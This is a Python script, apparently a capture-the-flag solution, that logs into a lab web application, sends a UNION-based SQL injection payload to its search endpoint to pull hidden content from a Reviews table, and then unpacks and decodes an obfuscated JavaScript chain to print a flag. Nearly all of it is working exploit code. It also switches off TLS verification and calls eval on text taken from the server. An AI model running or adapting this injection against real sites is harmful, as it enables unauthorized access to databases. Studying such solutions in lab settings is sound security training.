#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import configparser
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import urllib
import jsbeautifier.unpackers.packer as packer
import codecs


#
# Variables
#

debugOrNot = False
target_hostname = 'servertohack.localdomain'
target_proto = 'https'
config = configparser.ConfigParser()
config.read('config.ini')
username = config['credentials']['username']
password = config['credentials']['password']
base_url = target_proto + '://' + target_hostname


#
# Debug
#

def myDebug(param):
  if debugOrNot == True:
    print(param)


#
# requestDebug
#

def requestDebug(s, req):
  prepared = req.prepare()
  myDebug('-----------REQUEST-----------')
  myDebug(prepared.method + ' ' + prepared.url)
  myDebug('\n'.join('{}: {}'.format(k, v) for k, v in prepared.headers.items()))
  if prepared.body != None:
    myDebug('\n' + prepared.body)
  r = s.send(prepared)
  r.encoding = 'UTF-8'
  myDebug('\n-----------RESPONSE-----------')
  myDebug('\n'.join('{}: {}'.format(k, v) for k, v in r.headers.items()) + '\n')
  return r


#
# Main
#

s = requests.Session()
s.verify = False

headers = {
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36',
  'Accept-Encoding': 'none'
}


#
# Get __RequestVerificationToken hidden parameter from FORM
#

req = requests.Request('GET', base_url, headers=headers)
r = requestDebug(s, req)
cookies = requests.utils.dict_from_cookiejar(s.cookies)
token = BeautifulSoup(r.text, 'lxml').find('input', { 'name': '__RequestVerificationToken' }).get('value')
myDebug(token)


#
# Login
#

headers['Content-Type'] = 'application/x-www-form-urlencoded'
payload = 'Login=' + urllib.parse.quote_plus(username) + '&Password=' + urllib.parse.quote_plus(password) + '&__RequestVerificationToken=' + token
req = requests.Request('POST', base_url + '/Login?returnurl=%2F', headers=headers, data=payload, cookies=cookies)
r = requestDebug(s, req)
cookies = requests.utils.dict_from_cookiejar(s.cookies)
del headers['Content-Type']


#
# SQL Injection : "1' and 1=0 union select 1,2,Content,4,null,null from Reviews where id=10 -- -"
#

req = requests.Request('GET', base_url + '/Search?query=1%27+and+1%3D0+union+select+1%2C2%2CContent%2C4%2Cnull%2Cnull+from+Reviews+where+id%3D10+--+-', headers=headers, cookies=cookies)
r = requestDebug(s, req)
img = BeautifulSoup(r.text, 'lxml').find('img', { 'src': '2' }).get('alt')
first_obfuscated_part = img.split('\n', 3)[2]
second_obfuscated_part = img.split('\n', 4)[3]


#
# Reverse algorithm in second_obfuscated_part to get the "good" input
#

second_part_unpacked = packer.unpack(img.split('\n', 4)[3]).split(';', 2)[0]
flag = eval(second_part_unpacked.split()[1].split('"')[1])
myDebug('1:\n%s\n' % flag)
input = flag[::-1]
myDebug('2:\n%s\n' % input)
intermediate = ""
for i in range(len(input)):
  intermediate += chr(input[i] - 20) if i % 2 == 0 else chr(input[i])
myDebug('3:\n%s\n' % intermediate)
input = intermediate.replace('\\x', '')
myDebug('4:\n%s\n' % input)
intermediate = b''
for i in range(0, len(input), 2):
  intermediate += codecs.decode(input[i:i+2], 'hex')
input = codecs.decode(intermediate, 'base64').decode()
myDebug('5:\n%s\n' % input)
print(codecs.decode(input, 'rot_13')) 


#
# Logout
#

req = requests.Request('GET', base_url + '/Account/Logout', headers=headers, cookies=cookies)
r = requestDebug(s, req)

